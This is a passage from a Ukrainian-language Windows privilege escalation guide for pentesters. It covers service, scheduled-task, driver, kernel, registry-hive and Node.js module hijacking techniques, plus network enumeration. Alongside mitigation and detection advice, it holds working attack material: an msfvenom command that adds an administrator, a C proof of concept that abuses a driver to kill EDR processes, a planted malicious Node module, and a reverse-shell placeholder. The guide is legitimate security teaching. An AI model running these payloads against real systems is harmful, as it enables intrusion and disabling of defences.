Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ви можете виявити й експлуатувати** цю вразливість за допомогою metasploit: `exploit/windows/local/trusted\_service\_path`. Ви можете вручну створити бінарний файл служби за допомогою metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Дії відновлення

Windows дозволяє користувачам указувати дії, які слід виконати в разі збою служби. Цю функцію можна налаштувати так, щоб вона вказувала на двійковий файл. Якщо цей файл можна замінити, може стати можливим підвищення привілеїв. Докладніше див. в [офіційній документації](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Цілі скриптів запланованих завдань

Для ввімкненого завдання, яке запускає `cmd.exe /c` із файлом `.bat` або `.cmd`, перевірте скрипт, указаний в **аргументах дії**, а також `cmd.exe`. Те саме стосується явного аргументу-файлу інтерпретатора, наприклад PowerShell `-File`. Якщо запланований пакетний файл містить буквальний виклик PowerShell `-File`, також перевірте ACL указаного скрипту; змінні, умовні конструкції та з’єднання команд у shell потрібно відстежувати вручну. Скрипт або батьківський каталог, доступні для запису поточному користувачеві, є приводом перевірити можливість виконання коду з іншого облікового запису лише тоді, коли налаштований суб’єкт завдання відрізняється від поточного користувача й завдання справді доходить до цієї дії. ACL лише на дописування можуть мати значення для скриптів, але попередній `exit` або інший потік керування може зробити дописані рядки недосяжними. Перш ніж стверджувати, що можливе підвищення привілеїв, перевірте фактичні ACL, [контекст виконання завдання](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), робочий каталог, тригер і політику контролю програм. Під час інвентаризації не змінюйте скрипт і не запускайте завдання.

## Іменовані потоки в доступних файлах

У NTFS читабельний файл може містити іменований потік `:$DATA`, вміст якого не відображається у звичайному списку каталогів. Для невеликого релевантного набору доступних резервних копій або файлів конфігурації перевірте **назви й розміри** потоків, перш ніж відкривати їхній вміст; Windows надає доступ до них через [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) і PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Назва потоку, що натякає на наявність секрету, — лише зачіпка. Перевірте фактичні права на читання файлу, підтримку потоків файловою системою, наявність у потоці придатних до використання облікових даних і те, під яким обліковим записом вони справді проходять автентифікацію. Під час звичайного переліку не скануйте потоки рекурсивно й не виводьте їхній вміст.

## Вхідні файли допоміжної програми Windows Driver Kit для запланованих завдань

Необов’язковий Windows Driver Kit містить `StandaloneRunner.exe`, який може використовувати файли `command.txt`, `reboot.rsf` і файл проєкту `working\rsf.rsf` зі свого каталогу запуску. Заплановане завдання або служба, що запускає цю допоміжну програму з привілейованим обліковим записом, може перетворити доступ для запису до цих вхідних файлів, наданий користувачеві з низькими привілеями, на виконання команд у контексті цього облікового запису, навіть якщо виконуваний файл програми захищений. Переконайтеся, що їх використовує привілейований процес і що **обидва** допоміжні файли можна створити або змінити; самого виявлення допоміжної програми недостатньо.

Для запланованого завдання перевірте його дію [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) і ACL обох допоміжних шляхів. Якщо для завдання не вказано робочий каталог, каталог виконуваного файлу — лише зачіпка, яку потрібно перевірити, а не доказ того, звідки завдання читає вхідні файли. Також має виконуватися передумова щодо файлу проєкту. Перевірте фактичний суб’єкт завдання, а не припускайте, що воно працює від імені SYSTEM.

## Програми

### Встановлені програми

Перевірте **дозволи для двійкових файлів** (можливо, один із них можна перезаписати й підвищити привілеї) і **каталогів** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Шлях відновлення агента Checkmk для Windows

[CVE-2024-0670](https://checkmk.com/werk/16361) стосується старіших агентів Checkmk для Windows, які записували файли команд у `C:\Windows\Temp`, а потім виконували наявний файл, захищений від запису, якщо замінити його не вдавалося. Постачальник виправив проблему у версіях 2.1.0p40, 2.2.0p23, 2.3.0b1 і 2.4.0b1. Перевірте повний рівень оновлення встановленої версії та чи може виконуватися уражена операція агента; позначка лише з номером гілки, наприклад `2.1`, не дає змоги встановити наявність вразливості. Під час збору даних можна перевірити версію, стан служби та дозволи для Temp, не створюючи файлів і не запускаючи команди агента.

#### Перевірка служби ADSelfService Plus SAML

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) стосувалася ADSelfService Plus збірки 6210 і попередніх; постачальник виправив її у збірці 6211. Вона актуальна, лише якщо SAML SSO **увімкнено або було увімкнено**. Тому запис про встановлений продукт чи шлях до служби — це підказка, а не висновок про вразливість: підтвердьте точну збірку, історію конфігурації SAML, доступність служби з мережі та обліковий запис, від імені якого вона працює. Виконання коду через службу використовує привілеї цього облікового запису; виконання від імені SYSTEM можливе лише для екземпляра, запущеного від імені SYSTEM. Доступний для читання файл `OfflineBackup_*.ezip` у каталозі Backup продукту — це окрема підказка щодо зашифрованої резервної копії, а не доказ наявності придатних облікових даних чи цієї вразливості SAML. Під час звичайного збору даних зафіксуйте його шлях і права доступу, не розпаковуючи його.

#### Межі контролера Jenkins і доменного облікового запису

На контролері Jenkins під Windows розрізняйте право створювати або налаштовувати завдання та право запускати його: [Jenkins описує їх як окремі права `Job/Create`, `Job/Configure` і `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Запланований запуск або віддалений тригер можуть забезпечити інший спосіб запуску збірки, але підтвердьте, що вони ввімкнені й збірка справді виконується. Код виконується від імені контролера або вибраного агента, а збережені облікові дані можна використати, лише якщо завдання має доступ до їхньої області дії. Окремо перевірте доступ до метаданих `JENKINS_HOME`: Jenkins зберігає облікові дані й ключі шифрування у файлах `credentials.xml`, `secrets/hudson.util.Secret` і `secrets/master.key` ([сховище секретів Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Сам факт їхньої наявності не розкриває пароль; перевірте **право читання необхідних файлів** і окремий шлях повторного використання облікового запису, не виводячи секрети у спільний вивід. Якщо цей обліковий запис має право запису в `scriptPath` об’єкта користувача AD, перш ніж вважати це виконанням коду від імені іншого користувача, підтвердьте наявність доступного для запису шляху до скрипту та реального процесу входу або планувальника, що виконується від імені цільового користувача. Для подальшого контролю групи потрібно окремо перевірити ефективні права AD.

#### Ідентифікація self-hosted агента Azure Pipelines

Для проєкту Azure DevOps Server або Azure Pipelines розрізняйте право **створювати чи редагувати** pipeline, право **ставити його в чергу** та право використовувати вибраний пул агентів; [Microsoft окремо описує дозволи pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) і [авторизацію пулу](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Якщо обліковий запис із нижчими привілеями може надіслати крок зі скриптом і запустити цей pipeline на self-hosted агенті Windows, крок виконується від імені [налаштованого облікового запису операційної системи агента](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Перш ніж заявляти про перехід до іншого користувача чи SYSTEM, перевірте конкретний pipeline, обмеження гілок і ресурсів, авторизований пул, завдання, яке можна запустити, та ідентифікатор облікового запису служби агента. Сам факт встановлення агента, наявність ролі в проєкті чи право запису в репозиторій — лише підказка; під час пасивного збору даних перевірте дозволи й локальні метадані служби, не запускаючи збірку.

#### Облікові дані Microsoft Entra Connect Sync

[Microsoft розрізняє](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **обліковий запис служби ADSync**, від імені якого працює служба синхронізації та який має доступ до її бази даних SQL, і **обліковий запис з’єднувача AD DS**, права якого в каталозі залежать від налаштованих функцій синхронізації. Облікові дані з’єднувача зберігаються в цій базі даних у зашифрованому вигляді, а ключовий матеріал [захищено за допомогою DPAPI від імені облікового запису служби ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Встановлена служба синхронізації, група з назвою, що натякає на локальні права адміністратора, або сам доступ до бази даних не доводять, що облікові дані можна розшифрувати чи підвищити привілеї в домені. Окремо перевірте фактичні права читання бази даних, доступ до облікового запису служби та ключа, розташування інсталяції й SQL, налаштований ідентифікатор з’єднувача та ефективні права цього ідентифікатора в AD. Під час звичайного збору даних показуйте лише метадані служби та доступу; не запитуйте й не виводьте збережені секрети.

#### Дозволи для бібліотек підтримки драйвера принтера

Встановлений драйвер принтера може зберігати бібліотеки підтримки в `C:\ProgramData` і завантажувати їх у привілейованіший процес друку. Перевірте ACL точного каталогу драйвера та DLL, зокрема батьківських каталогів і точок повторної обробки, навіть якщо перелік принтерів через WMI недоступний. Для [проблеми з драйвером принтера Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) вказаний шлях — `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [початковий опис проблеми](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) описує завантаження DLL процесом `PrintIsolationHost.exe`. ACL, що дозволяє запис, — лише підказка: перевірте фактичну можливість запису з урахуванням заборонних записів, чи встановлено відповідний драйвер і чи завантажує він файл із привілейованими правами, а також чи виправляють інсталяцію оновлений драйвер або програма безпеки постачальника. Не робіть висновок про вразливість лише за назвою каталогу чи версією драйвера.

### Дозволи на запис

Перевірте, чи можете змінити файл конфігурації, щоб прочитати спеціальний файл, або змінити двійковий файл, який виконуватиметься від імені облікового запису адміністратора (schedtasks).

Щоб знайти каталоги й файли зі слабкими дозволами в системі, виконайте:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Автозавантаження плагінів Notepad++ для persistence/виконання

Notepad++ автоматично завантажує будь-яку DLL плагіна з підпапок `plugins`. Якщо встановлено портативну або скопійовану версію з доступом на запис, розміщення шкідливого плагіна забезпечує автоматичне виконання коду в `notepad++.exe` під час кожного запуску (зокрема з `DllMain` і callback-функцій плагіна).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Запуск під час старту

**Перевірте, чи можете ви перезаписати якийсь реєстровий ключ або бінарний файл, який запускатиме інший користувач.**\
**Прочитайте** **цю сторінку**, щоб дізнатися більше про цікаві **місця autoruns для підвищення привілеїв**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Драйвери

Шукайте потенційно **дивні/вразливі драйвери сторонніх виробників**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Якщо драйвер надає примітив довільного читання/запису в kernel memory (що часто трапляється в погано спроєктованих обробниках IOCTL), можна підвищити привілеї, безпосередньо викравши SYSTEM token із kernel memory.<sup>[[13]](#references)</sup> Покроковий опис техніки наведено тут:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Пов’язані матеріали з експлуатації Windows kernel:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Для race-condition bugs, коли вразливий виклик відкриває контрольований атакувальником шлях Object Manager, навмисне сповільнення пошуку (за допомогою компонентів максимальної довжини або глибоких ланцюжків каталогів) може збільшити вікно з мікросекунд до десятків мікросекунд:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF у cancel-safe queue, витоки з paged pool і pivots через I/O ring

Деякі ланцюжки Windows kernel LPE можна побудувати з двох окремо слабких багів: **гонки життєвого циклу cancel-safe queue**, яка звільняє запит/CBD, поки блокування черги все ще утримується, і витоку через **звільнення блокування перед копіюванням**, коли звільнена алокація paged pool витікає під час `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Нотатки з аудиту та експлуатації:

- **Звільнення під блокуванням + подальше скасування**: шукайте шлях успішного виконання, що робить **Acquire -> CompleteRequest/free -> Release**, тоді як шлях скасування робить **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Якщо шлях успішного виконання доходить до `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` до звільнення блокування CBDQ/CSQ, потік, заблокований у `NtCancelIoFileEx -> IopCsqCancelRoutine`, може згодом продовжити виконання та передати звільнений `PFLT_CALLBACK_DATA` назад у callback видалення драйвера.
- **Повторно використайте звільнений об’єкт черги**, виділивши об’єкт paged pool такого самого розміру, контрольований атакувальником. `NPFS` Data Queue Entries корисні, оскільки їхній payload і розмір можна контролювати, а згодом їх можна перевірити за допомогою операцій читання/перегляду pipe. Якщо звільнений об’єкт містить посилання списку, перезапишіть їх **циклічним списком фальшивих вузлів запитів у user memory**, щоб драйвер багаторазово обробляв структури запитів, визначені атакувальником, замість завершення на початковій голові списку.
- **Перетворіть передбачуваний запис на потужніший примітив**: якщо фальшивий запит перенаправляє вкладений вказівник контексту, який використовується для bookkeeping-записів (timestamp / QPC / поля поруч із refcount), можна отримати **запис у контрольовану адресу, але неконтрольоване значення**. У такому разі націльтеся на поле **довжини/розміру** розпиленого pool-об’єкта, а не на кінцевий вказівник на код/дані, а потім переберіть розпилені об’єкти, доки пошкоджений об’єкт не дасть **читання paged pool за межами буфера**.
- **Шаблон витоку з можливістю гонки**: будь-який syscall, що виконує `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)`, є перспективним кандидатом. Надійність підвищується, якщо атакувальник може збільшити скопійований буфер (наприклад, додавши багато записів списку/ресурсів, що збільшують остаточний розмір алокації serializer), оскільки довше копіювання розширює вікно для заміни без обов’язкового падіння системи.
- **Цілі для поповнення з великою кількістю вказівників**: зареєстровані буфери Windows **I/O ring** — чудові цілі для витоку, оскільки розмір їхнього paged pool контролюється атакувальником (`8 * regBufferCnt`), а кожен елемент є kernel pointer на `_IOP_MC_BUFFER_ENTRY`. Витік одного з таких масивів дає змогу відновити навколишній `IORING_OBJECT`, а потім пошкодити **`RegBuffers`** і **`RegBuffersCount`**, щоб наступні операції I/O ring використовували підроблені атакувальником записи та надавали довільне читання/запис у kernel. Якщо доступний лише запис зі стабільним байтом (наприклад, із `KUSER_SHARED_DATA+0x14`), скористайтеся **перекривними невирівняними записами**, щоб сформувати user pointer із повторюваних байтів, наприклад `0x0101010101010101`, відобразіть його за допомогою `VirtualAlloc` і розмістіть там підроблений масив зареєстрованих буферів.<sup>[[30]](#references)</sup>

Корисні індикатори для налагодження:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Після отримання довільного читання/запису в kernel через пошкоджене I/O ring викрадіть SYSTEM token за стандартним workflow після отримання примітива:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Примітиви пошкодження пам’яті куща реєстру

Сучасні вразливості кущів реєстру дають змогу формувати детерміновані розкладки, зловживати доступними для запису нащадками HKLM/HKU і перетворювати пошкодження метаданих на переповнення kernel paged-pool без спеціального драйвера. Повний ланцюжок описано тут:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Type confusion у direct-mode `RtlQueryRegistryValues` через шляхи, контрольовані атакувальником

Деякі драйвери приймають шлях до реєстру з userland, перевіряють лише, чи це коректний UTF-16-рядок, а потім викликають `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` з `RTL_QUERY_REGISTRY_DIRECT`, передаючи адресу скалярної змінної у стеку, наприклад `int readValue`. Якщо відсутній `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` інтерпретується відповідно до **фактичного** типу реєстру, а не типу, який очікував розробник.

Це створює два корисні примітиви:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: контрольований користувачем абсолютний шлях `\Registry\...` дає змогу драйверу запитувати вибрані атакувальником ключі, виявляти їхню наявність через коди повернення/журнали, а іноді читати значення, до яких викликач не мав би прямого доступу.
- **Пошкодження пам’яті ядра**: скалярне призначення, як-от `&readValue`, зазнає type confusion і сприймається як `REG_QWORD`, `UNICODE_STRING` або буфер із заданим розміром — залежно від типу значення реєстру.

Практичні примітки щодо експлуатації:

- **Захист у Windows 8+**: якщо запит звертається до **недовіреного куща** з `RTL_QUERY_REGISTRY_DIRECT`, але без `RTL_QUERY_REGISTRY_TYPECHECK`, виклики з ядра призводять до аварійного завершення з `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Щоб зберегти можливість експлуатації, шукайте **доступні для запису ключі в довірених системних кущах**, а не розміщуйте значення в `HKCU`.
- **Розміщення даних у довіреному кущі**: використовуйте NtObjectManager, щоб знайти доступні для запису нащадки `\Registry\Machine`, а потім повторно запустіть сканування з дубльованим токеном **низького рівня цілісності**, щоб виявити ключі, доступні ізольованим контекстам:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: прямий запис 8 байтів у 4-байтовий `int` пошкоджує сусідні дані стека та може частково перезаписати сусідній callback/function pointer.
- **`REG_SZ` / `REG_EXPAND_SZ`**: у прямому режимі очікується, що `EntryContext` вказує на `UNICODE_STRING`. Якщо код спочатку завантажує контрольований зловмисником `REG_DWORD` у скаляр стека, а потім повторно використовує той самий буфер для читання рядка, зловмисник контролює `Length`/`MaximumLength` і частково впливає на вказівник `Buffer`, що дає напівконтрольований запис у ядро.
- **`REG_BINARY`**: для великих бінарних даних прямий режим трактує перший `LONG` за адресою `EntryContext` як розмір буфера зі знаком. Якщо попереднє читання `REG_DWORD` залишає в повторно використаному скалярі контрольоване зловмисником **від’ємне** значення, наступний запит `REG_BINARY` копіює байти зловмисника безпосередньо поверх сусідніх слотів стека. Це часто найпростіший шлях до повного перезапису callback pointer.

Надійний шаблон для пошуку: **різнотипні читання з реєстру в ту саму змінну стека без її повторної ініціалізації**. Виконуйте пошук за `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, повторно використаними вказівниками `EntryContext` і гілками коду, у яких перше читання з реєстру визначає, чи відбудеться друге.

#### Зловживання відсутністю FILE_DEVICE_SECURE_OPEN в об’єктах пристроїв (LPE + знищення EDR)

Деякі підписані сторонні драйвери створюють об’єкт пристрою зі строгим SDDL за допомогою IoCreateDeviceSecure, але забувають установити FILE_DEVICE_SECURE_OPEN у DeviceCharacteristics. Без цього прапорця захищений DACL не застосовується, коли пристрій відкривають через шлях із додатковим компонентом. Це дає змогу будь-якому непривілейованому користувачу отримати handle, використовуючи шлях простору імен на кшталт:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (з реального випадку)

Отримавши змогу відкрити пристрій, користувач може зловживати привілейованими IOCTL, які надає драйвер, для LPE і втручання в роботу системи. Приклади можливостей, виявлених у реальних випадках:
- Повернення handle з повним доступом до довільних процесів (крадіжка токена / оболонка SYSTEM через DuplicateTokenEx/CreateProcessAsUser).
- Необмежене читання/запис на диск у raw-режимі (втручання в систему офлайн, трюки зі збереженням доступу під час завантаження).
- Завершення довільних процесів, зокрема Protected Process/Light (PP/PPL), що дає змогу знищувати AV/EDR із user land через ядро.

Мінімальний шаблон PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Заходи пом’якшення для розробників
- Завжди задавайте FILE_DEVICE_SECURE_OPEN під час створення об’єктів пристроїв, які мають бути обмежені за допомогою DACL.
- Перевіряйте контекст виклику для привілейованих операцій. Додавайте перевірки PP/PPL перед тим, як дозволяти завершення процесу або повертати дескриптори.
- Обмежуйте IOCTL (маски доступу, METHOD_*, перевірка вхідних даних) і розгляньте брокерні моделі замість прямого доступу до привілеїв ядра.

Ідеї для виявлення
- Відстежуйте відкриття підозрілих імен пристроїв із user-mode (наприклад, \\ .\\amsdk*) та певні послідовності IOCTL, що можуть свідчити про зловживання.
- Застосовуйте список заблокованих вразливих драйверів Microsoft (HVCI/WDAC/Smart App Control) і підтримуйте власні списки дозволів і заборон.

## PATH DLL Hijacking

Якщо у вас є **дозвіл на запис у папку, наявну в PATH**, ви можете перехопити DLL, завантажену процесом, і **підвищити привілеї**.<sup>[[2]](#references)</sup>

Перевірте дозволи для всіх папок у PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Докладніше про те, як скористатися цією перевіркою:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking роздільної здатності модулів Node.js / Electron через `C:\node_modules`

Це варіант **неконтрольованого шляху пошуку Windows**, який впливає на програми **Node.js** і **Electron**, коли вони виконують імпорт без зазначення шляху, наприклад `require("foo")`, а очікуваний модуль **відсутній**.<sup>[[20]](#references)</sup>

Node шукає пакети, рухаючись угору деревом каталогів і перевіряючи папки `node_modules` у кожному батьківському каталозі. У Windows цей пошук може сягнути кореня диска, тому програма, запущена з `C:\Users\Administrator\project\app.js`, може перевіряти такі шляхи:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Якщо **користувач із низькими привілеями** може створити `C:\node_modules`, він може розмістити там шкідливий `foo.js` (або папку пакета) і чекати, поки **процес Node/Electron із вищими привілеями** спробує знайти відсутню залежність. Payload виконується в контексті безпеки процесу-жертви, тож це дає змогу підвищити привілеї, якщо ціль запускається від імені адміністратора, із підвищеними привілеями через заплановане завдання або обгортку служби чи як програма робочого столу з автоматичним запуском і привілеями.

Таке особливо часто трапляється, коли:

- залежність указана в `optionalDependencies`<sup>[[22]](#references)</sup>
- стороння бібліотека обгортає `require("foo")` у `try/catch` і продовжує роботу після помилки
- пакет видалили зі збірок для production, не включили під час пакування або його не вдалося встановити
- вразливий виклик `require()` розташований глибоко в дереві залежностей, а не в основному коді програми

### Пошук вразливих цілей

Скористайтеся **Procmon**, щоб підтвердити шлях пошуку:<sup>[[23]](#references)</sup>

- Встановіть фільтр `Process Name` = виконуваний файл цілі (`node.exe`, EXE-файл програми Electron або процес-обгортка)
- Встановіть фільтр `Path` `contains` `node_modules`
- Звертайте увагу на `NAME NOT FOUND` і останнє успішне відкриття в `C:\node_modules`

Корисні шаблони для аналізу коду в розпакованих файлах `.asar` або вихідному коді програми:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Експлуатація

1. Визначте **назву відсутнього пакета** за допомогою Procmon або аналізу вихідного коду.
2. Створіть кореневий каталог пошуку, якщо його ще не існує:

```powershell
mkdir C:\node_modules
```

3. Розмістіть модуль із точно очікуваною назвою:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Запустіть застосунок-жертву. Якщо застосунок намагається виконати `require("foo")`, а легітимний модуль відсутній, Node може завантажити `C:\node_modules\foo.js`.

Реальні приклади відсутніх необов’язкових модулів, що відповідають цьому шаблону, — `bluebird` і `utf-8-validate`, але повторно використовуваною частиною є **техніка**: знайдіть будь-який **відсутній bare import**, який привілейований процес Windows Node/Electron намагатиметься знайти.

### Ідеї для виявлення та посилення захисту

- Створіть сповіщення про створення користувачем `C:\node_modules` або запис нових файлів/пакетів `.js` у цю папку.
- Відстежуйте процеси з високим рівнем цілісності, які читають дані з `C:\node_modules\*`.
- Додавайте всі залежності середовища виконання до production-збірки та перевіряйте використання `optionalDependencies`.
- Перевіряйте сторонній код на наявність шаблонів `try { require("...") } catch {}`, які не виводять помилок.
- Вимикайте необов’язкові перевірки, якщо бібліотека це підтримує (наприклад, у деяких розгортаннях `ws` можна уникнути застарілої перевірки `utf-8-validate`, задавши `WS_NO_UTF_8_VALIDATE=1`).

## Мережа

### Спільні ресурси

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### файл hosts

Перевірте, чи не вказані у файлі hosts жорстко задані адреси інших відомих комп’ютерів.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Мережеві інтерфейси та DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Відкриті порти

Перевірте наявність **служб з обмеженим доступом** ззовні

```bash
netstat -ano #Opened ports?
```

Для локального слухача зіставте його PID із власником процесу, шляхом до виконуваного файла та службою або запланованим завданням, яке його запускає. Служба віддаленого керування може надати доступ із правами свого користувача лише за умови, що це дозволяють її автентифікація та засоби керування командами. Користувацька TCP-програма, що працює від імені облікового запису з вищими привілеями, потребує окремої перевірки: слухач і шлях до бінарного файла — це лише пасивні зачіпки, а для підтвердження автентифікованого сценарію з пошкодженням пам’яті потрібно проаналізувати саме цей бінарний файл і доступний для нього ввід. Якщо виявлений порт, схоже, належить системному процесу, перш ніж визначати службу на кінцевому вузлі, зіставте його з [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface); саме правило перенаправлення не доводить, що кінцевий вузол доступний або вразливий.

### Таблиця маршрутизації

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Таблиця ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Правила брандмауера

[**Перегляньте цю сторінку, щоб знайти команди для роботи з брандмауером**](../basic-cmd-for-pentesters.md#firewall) **(перегляд правил, створення правил, вимкнення тощо)**

Більше [команд для переліку мережевих ресурсів тут](../basic-cmd-for-pentesters.md#network)

### Підсистема Windows для Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Бінарний файл `bash.exe` також можна знайти в `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Якщо ви отримаєте права користувача root, то зможете прослуховувати будь-який порт (під час першої спроби прослухати порт за допомогою `nc.exe` з’явиться графічне вікно із запитом, чи дозволити `nc` працювати через брандмауер).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Щоб легко запустити bash від імені root, можна спробувати `--default-user root`

Файлову систему `WSL` можна переглянути в папці `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

